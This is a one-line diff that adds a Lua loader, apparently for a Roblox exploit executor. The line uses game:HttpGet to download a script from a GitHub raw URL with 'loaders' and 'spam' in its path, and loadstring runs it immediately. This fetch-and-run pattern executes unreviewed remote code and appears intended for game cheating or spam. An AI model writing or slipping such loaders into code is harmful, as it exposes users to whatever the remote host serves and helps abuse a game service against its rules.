@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/wanted-update-spam0-bo6x6z78kwr6kk.lua"))()
